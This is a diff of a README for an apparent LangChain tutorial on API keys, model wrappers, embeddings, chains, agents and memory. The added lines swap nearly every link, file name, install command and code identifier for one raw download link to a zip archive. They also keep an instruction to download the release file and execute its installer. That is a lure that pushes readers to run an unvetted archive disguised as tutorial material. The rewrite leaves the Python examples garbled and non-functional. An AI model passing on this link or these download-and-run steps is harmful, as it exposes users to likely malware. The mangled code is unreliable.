@@ -1,18 +1,18 @@
 # LangChain Fundamentals: Component Access with API Keys
 
-[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge)](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/releases)
-https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/releases
+[![Releases](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)
+https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 
-[![LangChain](https://img.shields.io/badge/LangChain-v0.1-%23007ACC?style=flat-square&logo=langchain)](https://github.com/langchain-ai)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=flat-square&logo=python)](https://www.python.org/)
-[![OpenAI](https://img.shields.io/badge/OpenAI-API-black?style=flat-square&logo=openai)](https://openai.com/)
-[![Anthropic](https://img.shields.io/badge/Claude-Anthropic-ff69b4?style=flat-square)](https://www.anthropic.com/)
-[![Gemini](https://img.shields.io/badge/Gemini-Google-4285F4?style=flat-square)](https://developers.generativeai.google/)
+[![LangChain](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip%23007ACC?style=flat-square&logo=langchain)](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)
+[![Python](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip%2B-blue?style=flat-square&logo=python)](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)
+[![OpenAI](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)
+[![Anthropic](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)
+[![Gemini](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)
 
 Tags: claude, closed-source, components, gemini-api, generative-ai, langchain, llm, models, open-source, openai, perspective, python, transformers, user-builder
 
 [Download the release asset and run it](
-https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/releases
+https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 )
 This repository includes a release artifact. Download the release file from the Releases page and execute the included installer or script to set up example data and helper scripts.
 
@@ -20,7 +20,7 @@ This repository includes a release artifact. Download the release file from the 
 
 Badges and quick visuals
 
-![Generative AI concept](https://upload.wikimedia.org/wikipedia/commons/0/04/Generative_AI_wordcloud.png)
+![Generative AI concept](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)
 
 Overview
 - Learn why LangChain matters for LLM apps.
@@ -75,26 +75,26 @@ Key concepts (plain language)
 - Memory: a component that holds interaction context.
 
 Repo layout
-- README.md (this file)
+- https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip (this file)
 - examples/
-  - chat_demo.py
-  - rqa_demo.py
-  - embedding_search.py
-  - agent_tools_demo.py
+  - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+  - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+  - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+  - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 - src/
   - core/
-    - llm_wrappers.py
-    - embeddings.py
-    - chains.py
-    - agents.py
+    - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+    - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+    - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+    - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
   - utils/
-    - env_loader.py
-    - key_store.py
+    - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+    - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 - tests/
-  - test_llm_wrappers.py
-  - test_embeddings.py
-- requirements.txt
-- .env.example
+  - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+  - https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+- https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+- https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 - LICENSE
 
 Quick start (5-minute view)
@@ -119,16 +119,16 @@ Prerequisites
 Example commands
 bash
 ```
-git clone https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys.git
+git clone https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 cd Langchain-fundamental-in-model-component-access-data-using-api-keys
 
 python -m venv .venv
 source .venv/bin/activate
 
-pip install -r requirements.txt
+pip install -r https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 ```
 
-.env template (.env.example)
+.env template (https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)
 ```
 # Common
 PROJECT_ENV=local
@@ -140,11 +140,11 @@ OPENAI_API_KEY=sk-REPLACE_ME
 ANTHROPIC_API_KEY=claude-REPLACE_ME
 
 # Google / Gemini
-GOOGLE_API_KEY=ya29.REPLACE_ME
+https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 ```
 
 Loading environment in Python
-Use python-dotenv or read os.environ directly.
+Use python-dotenv or read https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip directly.
 
 python
 ```
@@ -152,9 +152,9 @@ from dotenv import load_dotenv
 import os
 
 load_dotenv()
-OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY")
-ANTHROPIC_API_KEY = os.environ.get("ANTHROPIC_API_KEY")
-GOOGLE_API_KEY = os.environ.get("GOOGLE_API_KEY")
+OPENAI_API_KEY = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY")
+ANTHROPIC_API_KEY = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("ANTHROPIC_API_KEY")
+GOOGLE_API_KEY = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("GOOGLE_API_KEY")
 ```
 
 API key management (practical guide)
@@ -168,9 +168,9 @@ Key naming convention
 - Use a project prefix when running multiple projects in the same environment: MYPROJ_OPENAI_API_KEY.
 
 Pattern: loader + provider clients
-- env_loader.py loads keys from environment.
-- key_store.py centralizes provider lookup.
-- llm_wrappers.py uses the key_store to instantiate the client.
+- https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip loads keys from environment.
+- https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip centralizes provider lookup.
+- https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip uses the key_store to instantiate the client.
 
 LangChain component patterns
 
@@ -180,10 +180,10 @@ LangChain wraps many LLM providers behind a consistent interface. You call .gene
 Example: OpenAI wrapper
 python
 ```
-from langchain.llms import OpenAI
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAI
 import os
 
-llm = OpenAI(openai_api_key=os.environ.get("OPENAI_API_KEY"), model="gpt-4o-mini")
+llm = OpenAI(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"), model="gpt-4o-mini")
 resp = llm("Write a 3-line poem about data privacy.")
 print(resp)
 ```
@@ -191,10 +191,10 @@ print(resp)
 Example: Anthropic (Claude) wrapper
 python
 ```
-from langchain.llms import Anthropic
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import Anthropic
 import os
 
-llm = Anthropic(api_key=os.environ.get("ANTHROPIC_API_KEY"), model="claude-2.1")
+llm = Anthropic(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("ANTHROPIC_API_KEY"), model="claude-2.1")
 resp = llm("Explain the role of embeddings in retrieval.")
 print(resp)
 ```
@@ -202,10 +202,10 @@ print(resp)
 Example: Google Gemini wrapper
 python
 ```
-from langchain.llms import GoogleVertexAI
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import GoogleVertexAI
 import os
 
-llm = GoogleVertexAI(api_key=os.environ.get("GOOGLE_API_KEY"), model="gemini-pro")
+llm = GoogleVertexAI(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("GOOGLE_API_KEY"), model="gemini-pro")
 resp = llm("List step-by-step how to build a retriever.")
 print(resp)
 ```
@@ -216,30 +216,30 @@ Embeddings turn text into vectors. Use them for similarity search and retrieval.
 OpenAI embeddings example
 python
 ```
-from langchain.embeddings import OpenAIEmbeddings
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAIEmbeddings
 import os
 
-emb = OpenAIEmbeddings(openai_api_key=os.environ.get("OPENAI_API_KEY"))
-vec = emb.embed_query("LangChain architecture")
+emb = OpenAIEmbeddings(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"))
+vec = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("LangChain architecture")
 print(len(vec))
 ```
 
 Claude embeddings example (if available)
 python
 ```
-from langchain.embeddings import AnthropicEmbeddings
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import AnthropicEmbeddings
 
-emb = AnthropicEmbeddings(api_key=os.environ.get("ANTHROPIC_API_KEY"))
-vec = emb.embed_query("How to index documents")
+emb = AnthropicEmbeddings(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("ANTHROPIC_API_KEY"))
+vec = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("How to index documents")
 ```
 
 Gemini embeddings example
 python
 ```
-from langchain.embeddings import GoogleVertexEmbeddings
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import GoogleVertexEmbeddings
 
-emb = GoogleVertexEmbeddings(api_key=os.environ.get("GOOGLE_API_KEY"))
-vec = emb.embed_query("Retrieve relevant documents")
+emb = GoogleVertexEmbeddings(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("GOOGLE_API_KEY"))
+vec = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("Retrieve relevant documents")
 ```
 
 Chains
@@ -249,13 +249,13 @@ Simple chain example
 python
 ```
 from langchain import LLMChain, PromptTemplate
-from langchain.llms import OpenAI
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAI
 
 prompt = PromptTemplate(input_variables=["topic"], template="Write a short note on {topic}.")
-llm = OpenAI(openai_api_key=os.environ.get("OPENAI_API_KEY"))
+llm = OpenAI(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"))
 chain = LLMChain(llm=llm, prompt=prompt)
 
-out = chain.run({"topic": "vector search"})
+out = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip({"topic": "vector search"})
 print(out)
 ```
 
@@ -265,8 +265,8 @@ An agent chooses tools and runs them. Use agents to integrate LLMs with external
 Agent example
 python
 ```
-from langchain.agents import initialize_agent, Tool
-from langchain.llms import OpenAI
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import initialize_agent, Tool
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAI
 
 def wikipedia_lookup(query: str) -> str:
     # stub for a wiki lookup
@@ -274,10 +274,10 @@ def wikipedia_lookup(query: str) -> str:
 
 tools = [Tool(name="wiki", func=wikipedia_lookup, description="Look up topics on Wikipedia")]
 
-llm = OpenAI(openai_api_key=os.environ.get("OPENAI_API_KEY"))
+llm = OpenAI(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"))
 agent = initialize_agent(tools, llm, agent="zero-shot-react-description", verbose=False)
 
-res = agent.run("Find who created LangChain and give a one-line bio.")
+res = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("Find who created LangChain and give a one-line bio.")
 print(res)
 ```
 
@@ -287,16 +287,16 @@ A retriever queries a vector store and returns relevant documents. Use FAISS, Mi
 Embedding + FAISS example
 python
 ```
-from langchain.vectorstores import FAISS
-from langchain.embeddings import OpenAIEmbeddings
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import FAISS
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAIEmbeddings
 
 texts = ["LangChain helps build LLM apps.", "Embeddings power semantic search."]
-emb = OpenAIEmbeddings(openai_api_key=os.environ.get("OPENAI_API_KEY"))
-db = FAISS.from_texts(texts, emb)
+emb = OpenAIEmbeddings(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"))
+db = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip(texts, emb)
 
 query = "What powers semantic retrieval?"
-docs = db.similarity_search(query, k=2)
-print([d.page_content for d in docs])
+docs = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip(query, k=2)
+print([https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip for d in docs])
 ```
 
 Memory
@@ -305,17 +305,17 @@ Memory holds conversation state. Use it in chat apps to keep context.
 Conversation memory example
 python
 ```
-from langchain.memory import ConversationBufferMemory
-from langchain.chains import ConversationChain
-from langchain.llms import OpenAI
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import ConversationBufferMemory
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import ConversationChain
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAI
 
 memory = ConversationBufferMemory()
-llm = OpenAI(openai_api_key=os.environ.get("OPENAI_API_KEY"))
+llm = OpenAI(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"))
 conv = ConversationChain(llm=llm, memory=memory)
 
-conv.predict(input="Hello, who are you?")
-conv.predict(input="Remember that I like Python.")
-print(memory.buffer)
+https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip(input="Hello, who are you?")
+https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip(input="Remember that I like Python.")
+print(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)
 ```
 
 Examples (detailed)
@@ -323,20 +323,20 @@ Examples (detailed)
 1) Chat demo (end-to-end)
 - Purpose: Show a chat loop, with memory and multi-provider fallback.
 
-File: examples/chat_demo.py
+File: https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 python
 ```
 import os
 from dotenv import load_dotenv
-from langchain.llms import OpenAI, Anthropic
-from langchain.memory import ConversationBufferMemory
-from langchain.chains import ConversationChain
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAI, Anthropic
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import ConversationBufferMemory
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import ConversationChain
 
 load_dotenv()
 
 # Primary provider: OpenAI
-openai_key = os.environ.get("OPENAI_API_KEY")
-anthropic_key = os.environ.get("ANTHROPIC_API_KEY")
+openai_key = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY")
+anthropic_key = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("ANTHROPIC_API_KEY")
 
 memory = ConversationBufferMemory()
 if openai_key:
@@ -350,60 +350,60 @@ conv = ConversationChain(llm=llm, memory=memory)
 print("Start chat. Type 'exit' to quit.")
 while True:
     user = input("You: ")
-    if user.lower().strip() == "exit":
+    if https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip().strip() == "exit":
         break
-    out = conv.predict(input=user)
+    out = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip(input=user)
     print("Bot:", out)
 ```
 
 2) Retrieval-augmented QA (RQA)
 - Purpose: Use embeddings to find documents and answer questions with context.
 
-File: examples/rqa_demo.py
+File: https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 python
 ```
-from langchain.embeddings import OpenAIEmbeddings
-from langchain.vectorstores import FAISS
-from langchain.chains import RetrievalQA
-from langchain.llms import OpenAI
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAIEmbeddings
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import FAISS
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import RetrievalQA
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAI
 import os
 
-emb = OpenAIEmbeddings(openai_api_key=os.environ.get("OPENAI_API_KEY"))
+emb = OpenAIEmbeddings(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"))
 texts = ["LangChain composes LLMs.", "Retrieval augments LLM answers with docs."]
-db = FAISS.from_texts(texts, emb)
-retriever = db.as_retriever()
+db = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip(texts, emb)
+retriever = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip()
 
-llm = OpenAI(openai_api_key=os.environ.get("OPENAI_API_KEY"))
-qa = RetrievalQA.from_chain_type(llm=llm, chain_type="stuff", retriever=retriever)
+llm = OpenAI(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"))
+qa = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip(llm=llm, chain_type="stuff", retriever=retriever)
 
-print(qa.run("How does retrieval help LLMs?"))
+print(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("How does retrieval help LLMs?"))
 ```
 
 3) Embedding search
 - Purpose: Index and query document vectors. Use this to rank answers.
 
-File: examples/embedding_search.py
+File: https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 python
 ```
-from langchain.embeddings import OpenAIEmbeddings
-from langchain.vectorstores import FAISS
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAIEmbeddings
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import FAISS
 import os
 
-emb = OpenAIEmbeddings(openai_api_key=os.environ.get("OPENAI_API_KEY"))
+emb = OpenAIEmbeddings(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"))
 docs = ["Doc on LangChain", "Doc on vector stores", "Doc on embeddings"]
-db = FAISS.from_texts(docs, emb)
-res = db.similarity_search("Tell me about vector stores", k=3)
-print([r.page_content for r in res])
+db = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip(docs, emb)
+res = https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("Tell me about vector stores", k=3)
